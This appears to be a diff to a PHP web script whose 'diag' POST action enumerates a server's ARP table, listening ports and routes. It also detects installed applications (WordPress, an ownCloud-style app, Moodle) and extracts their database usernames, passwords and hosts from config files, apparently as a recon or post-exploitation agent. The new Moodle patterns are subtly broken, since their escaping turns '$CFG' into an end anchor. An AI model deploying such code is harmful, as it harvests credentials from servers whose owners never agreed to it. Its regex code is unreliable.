@@ -99,6 +99,14 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
         }
     }
 
+    // Helper: split raw text into lines, optionally skipping a header row.
+    $__lines = function ($raw, $skipHeader = false) {
+        $lines = explode("\n", $raw);
+        if ($skipHeader && count($lines) > 0)
+            array_shift($lines);
+        return $lines;
+    };
+
     // --- Network: ARP table ---
     // /proc/net/arp columns: IP Address, HW type, Flags, HW address, Mask, Device.
     // Flags 0x0 = incomplete entry (kernel sent ARP request but got no reply) —
@@ -107,7 +115,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
     // create phantom Faraday hosts from failed ARP probes.
     $arpRaw = @file_get_contents('/proc/net/arp') ?: '';
     $arpHosts = [];
-    foreach (array_slice(explode("\n", $arpRaw), 1) as $line) {
+    foreach ($__lines($arpRaw, true) as $line) {
         $parts = preg_split('/\s+/', trim($line));
         if (count($parts) < 4 || $parts[0] === '')
             continue;
@@ -148,7 +156,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
     $openPortRaw = [];
     foreach (['/proc/net/tcp' => 4, '/proc/net/tcp6' => 6] as $tcpFile => $ipv) {
         $tcpRaw = @file_get_contents($tcpFile) ?: '';
-        foreach (array_slice(explode("\n", $tcpRaw), 1) as $line) {
+        foreach ($__lines($tcpRaw, true) as $line) {
             $parts = preg_split('/\s+/', trim($line));
             if (count($parts) < 10 || $parts[3] !== '0A')
                 continue;
@@ -206,7 +214,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
     $routeRaw = @file_get_contents('/proc/net/route') ?: '';
     $routes = [];
     $routeSeen = [];
-    foreach (array_slice(explode("\n", $routeRaw), 1) as $line) {
+    foreach ($__lines($routeRaw, true) as $line) {
         $p = preg_split('/\s+/', trim($line));
         if (count($p) >= 8 && $p[1] !== '') {
             $dest = long2ip(hexdec(strrev(hex2bin(str_pad($p[1], 8, '0', STR_PAD_LEFT)))));
@@ -714,6 +722,10 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
         return null;
     };
 
+    $__fwHas = function ($relPath) use ($__fwFind) {
+        return $__fwFind($relPath) !== null;
+    };
+
     // WordPress
     if ($p = $__fwFind('wp-includes/version.php')) {
         $ver = $__fwReadVer($p, '/\\$wp_version\\s*=\\s*[\'"]([^\'"]+)/');
@@ -897,22 +909,26 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
             $ver = null;
             if (preg_match('/\\$OC_VersionString\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m))
                 $ver = $m[1];
-            $fw = ['name' => $name, 'version' => $ver, 'config_path' => null, 'details' => []];
-            if ($cp = $__fwFind('config/config.php')) {
-                $fw['config_path'] = $cp;
-                $nc = @file_get_contents($cp, false, null, 0, 16384);
-                if ($nc) {
-                    if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $nc, $m))
-                        $fw['details']['db_name'] = $m[1];
-                    if (preg_match("/'dbuser'\\s*=>\\s*'([^']*)/", $nc, $m))
-                        $fw['details']['db_user'] = $m[1];
-                    if (preg_match("/'dbpassword'\\s*=>\\s*'([^']*)/", $nc, $m))
-                        $fw['details']['db_pass'] = $m[1];
-                    if (preg_match("/'dbhost'\\s*=>\\s*'([^']*)/", $nc, $m))
-                        $fw['details']['db_host'] = $m[1];
+            $hasConfig = $__fwHas('config/config.php');
+            $hasOcLib = $__fwHas('lib/private/legacy/OC_Util.php') || $__fwHas('lib/private/legacy/OC_App.php') || $__fwHas('lib/private/URLGenerator.php');
+            if ($hasConfig || $hasOcLib) {
+                $fw = ['name' => $name, 'version' => $ver, 'config_path' => null, 'details' => []];
+                if ($cp = $__fwFind('config/config.php')) {
+                    $fw['config_path'] = $cp;
+                    $nc = @file_get_contents($cp, false, null, 0, 16384);
+                    if ($nc) {
+                        if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $nc, $m))
+                            $fw['details']['db_name'] = $m[1];
+                        if (preg_match("/'dbuser'\\s*=>\\s*'([^']*)/", $nc, $m))
+                            $fw['details']['db_user'] = $m[1];
+                        if (preg_match("/'dbpassword'\\s*=>\\s*'([^']*)/", $nc, $m))
+                            $fw['details']['db_pass'] = $m[1];
+                        if (preg_match("/'dbhost'\\s*=>\\s*'([^']*)/", $nc, $m))
+                            $fw['details']['db_host'] = $m[1];
+                    }
                 }
+                $frameworks[] = $fw;
             }
-            $frameworks[] = $fw;
         }
     }
 
@@ -966,21 +982,22 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
     // Moodle
     if ($p = $__fwFind('version.php')) {
         $vc = @file_get_contents($p, false, null, 0, 4096);
-        if ($vc && preg_match('/\\$release\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m) && stripos($m[1], 'Moodle') !== false) {
-            $fw = ['name' => 'Moodle', 'version' => $m[1], 'config_path' => null, 'details' => []];
-            if ($cp = $__fwFind('config.php')) {
-                $fw['config_path'] = $cp;
-                $mc = @file_get_contents($cp, false, null, 0, 8192);
-                if ($mc) {
-                    if (preg_match("/\\$CFG->dbname\\s*=\\s*['\"]([^'\"]+)/", $mc, $m))
-                        $fw['details']['db_name'] = $m[1];
-                    if (preg_match("/\\$CFG->dbuser\\s*=\\s*['\"]([^'\"]+)/", $mc, $m))
-                        $fw['details']['db_user'] = $m[1];
-                    if (preg_match("/\\$CFG->dbpass\\s*=\\s*['\"]([^'\"]+)/", $mc, $m))
-                        $fw['details']['db_pass'] = $m[1];
-                    if (preg_match("/\\$CFG->dbhost\\s*=\\s*['\"]([^'\"]+)/", $mc, $m))
-                        $fw['details']['db_host'] = $m[1];
-                }
+        if ($vc && preg_match('/\\$release\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m) && stripos($m[1], 'Moodle') !== false && ($cp = $__fwFind('config.php'))) {
+            $fw = ['name' => 'Moodle', 'version' => $m[1], 'config_path' => $cp, 'details' => []];
+            $mc = @file_get_contents($cp, false, null, 0, 8192);
+            if ($mc) {
+                if (preg_match("/\$CFG->dbname\s*=\s*['\"]([^'\"]+)/", $mc, $m))
+                    $fw['details']['db_name'] = $m[1];
+                if (preg_match("/\$CFG->dbuser\s*=\s*['\"]([^'\"]+)/", $mc, $m))
+                    $fw['details']['db_user'] = $m[1];
+                if (preg_match("/\$CFG->dbpass\s*=\s*['\"]([^'\"]+)/", $mc, $m))
+                    $fw['details']['db_pass'] = $m[1];
+                if (preg_match("/\$CFG->dbhost\s*=\s*['\"]([^'\"]+)/", $mc, $m))
+                    $fw['details']['db_host'] = $m[1];
+                if (preg_match("/\$CFG->wwwroot\s*=\s*['\"]([^'\"]+)/", $mc, $m))
+                    $fw['details']['wwwroot'] = $m[1];
+                if (preg_match("/\$CFG->dataroot\s*=\s*['\"]([^'\"]+)/", $mc, $m))
+                    $fw['details']['dataroot'] = $m[1];
             }
             $frameworks[] = $fw;
         }
